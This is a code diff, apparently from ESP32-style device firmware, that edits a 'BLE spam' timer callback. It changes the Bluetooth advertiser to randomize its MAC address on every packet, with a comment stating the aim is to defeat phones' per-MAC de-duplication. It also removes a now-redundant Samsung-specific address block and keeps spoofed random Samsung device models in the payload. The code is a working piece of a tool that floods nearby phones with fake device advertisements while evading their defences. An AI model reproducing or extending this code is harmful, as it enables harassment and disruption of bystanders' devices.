@@ -29445,8 +29445,8 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         st->started = true;
     }
 
-    // Rotate random address on each packet (if not in first-start mode)
-    if (st->started) {
+    // Randomize MAC address every packet (defeats per-MAC phone de-duplication)
+    {
         ble_addr_t rnd_addr;
         if (ble_hs_id_gen_rnd(1, &rnd_addr) == 0) {
             ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &rnd_addr);
@@ -29513,12 +29513,7 @@ static void ble_spam_timer_cb(lv_timer_t *timer)
         break;
     }
     case BLE_SPAM_MODE_SAMSUNG: {
-        // Randomize MAC and model each cycle to defeat Samsung's per-MAC de-dupe
-        ble_addr_t samsung_addr;
-        esp_fill_random(samsung_addr.val, 6);
-        samsung_addr.val[0] = (samsung_addr.val[0] & 0xFE) | 0x02;  // Locally-administered random
-        ble_gap_ext_adv_set_addr(BLE_SPAM_ADV_INSTANCE, &samsung_addr);
-
+        // MAC already randomized above; randomize model each cycle
         static uint8_t samsung_payload[13];
         memcpy(samsung_payload, s_samsung_base_payload, 12);
         samsung_payload[12] = s_samsung_models[esp_random() % SAMSUNG_MODEL_COUNT];
